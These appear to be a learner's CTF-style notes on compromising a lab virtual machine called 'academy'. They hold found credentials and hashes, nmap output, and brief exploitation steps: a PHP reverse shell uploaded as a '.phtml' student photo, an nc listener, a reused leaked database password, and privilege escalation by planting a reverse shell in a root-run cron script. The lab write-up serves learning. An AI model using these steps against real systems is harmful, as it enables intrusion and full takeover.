_CREDS:_

(academy student portal)  
Username :Rum Ham  
Student Registration Number: 10201321  
Password: student [cd73502828457d15655bbd7a63fb0bc8]
 
(academy admin portal)  
Username: admin  
Password: admin [21232f297a57a5a743894a0e4a801fc3]
 
(on target host)  
Username: grimmie  
Password: My_V3ryS3cur3_P4ss
 _FINDINGS:_

Linpeas:  
/var/www/html/academy/includes/config.php:$mysql_password = "My_V3ryS3cur3_P4ss";
   
_nmap -vv -n -Pn -sS -T4 -p- -oN academy.nmap 10.0.2.4_

21/tcp open ftp syn-ack ttl 64  
22/tcp open ssh syn-ack ttl 64  
80/tcp open http syn-ack ttl 64  
MAC Address: 08:00:27:13:A7:2E (Oracle VirtualBox virtual NIC)
 _nmap -vv --script=vuln --script ftp-* -A -p 21,22,80 -oN academy_services.nmap 10.0.2.4_

21/tcp open ftp syn-ack ttl 64 vsftpd 3.0.3  
| vulners:  
| cpe:/a:vsftpd:vsftpd:3.0.3:  
| PRION:CVE-2021-3618 5.8 https://vulners.com/prion/PRION:CVE-2021-3618  
|_ PRION:CVE-2021-30047 5.0 https://vulners.com/prion/PRION:CVE-2021-30047
 
| ftp-anon: Anonymous FTP login allowed (FTP code 230)  
|_-rw-r--r-- 1 1000 1000 776 May 30 2021 note.txt
   

22/tcp open ssh syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)  
| vulners:  
| cpe:/a:openbsd:openssh:7.9p1:  
| EXPLOITPACK:98FE96309F9524B8C84C508837551A19 5.8 https://vulners.com/exploitpack/EXPLOITPACK:98FE96309F9524B8C84C508837551A19 *EXPLOIT*  
| EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 5.8 https://vulners.com/exploitpack/EXPLOITPACK:5330EA02EBDE345BFC9D6DDDD97F9E97 *EXPLOIT*
 
80/tcp open http syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))  
| vulners:  
| cpe:/a:apache:http_server:2.4.38:  
| CVE-2019-9517 7.8 https://vulners.com/cve/CVE-2019-9517  
/phpmyadmin/: phpMyAdmin
 
mysql Ver 15.1 Distrib 10.3.27-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
 
OS details: Linux 4.15 - 5.8
 
############################ FTP  
-rw-r--r-- 1 1000 1000 776 May 30 2021 note.txt  
226 Directory send OK.  
ftp> more note.txt  
Hello Heath !  
Grimmie has setup the test website for the new academy.  
I told him not to use the same password everywhere, he will change it ASAP.
 
I couldn't create a user via the admin panel, so instead I inserted directly into the database with the following command:
 
INSERT INTO `students` (`StudentRegno`, `studentPhoto`, `password`, `studentName`, `pincode`, `session`, `department`, `semester`, `cgpa`, `creationdate`, `updationDate`) VALUES  
('10201321', '', 'cd73502828457d15655bbd7a63fb0bc8', 'Rum Ham', '777777', '', '', '', '7.60', '2021-05-29 14:36:56', '');
 
The StudentRegno number is what you use for login.
 
Le me know what you think of this open-source project, it's from 2020 so it should be secure... right ?  
We can always adapt it to our needs.
 
-jdelta
 
############################ SSH
   

############################ WEB  
Dirbuster:  
[http://10.0.2.4/phpmyadmin/index.php](http://10.0.2.4/phpmyadmin/index.php)  
/academy/admin/index.php  
/academy/admin/print.php  
/academy/db/onlinecourse.sql --> admin credentials  
INSERT INTO `admin` (`id`, `username`, `password`, `creationDate`, `updationDate`) VALUES  
(1, 'admin', '21232f297a57a5a743894a0e4a801fc3', '2020-01-24 16:21:18', '03-06-2020 07:09:07 PM');
 
Crontab  
* * * * * /home/grimmie/backup.sh
 
## Exploitation

Php-reverse-shell.php > image.phtml  
Nc -nlvp 1234  
[http://10.0.2.4/academy/studentphoto/image.phtml](http://10.0.2.4/academy/studentphoto/image.phtml)  
Rev shell: ww-data
 
Got linpeas on the host  
PHP config file leaked password  
Su grimmie with password
 
Get pspy on target host to monitor the backup.sh service  
Root is executing the cronjob  
CMD: UID=0 PID=11286 | /bin/sh -c /home/grimmie/backup.sh
 
Put reverse shell in backup.sh, listen for root shell on local host
 
root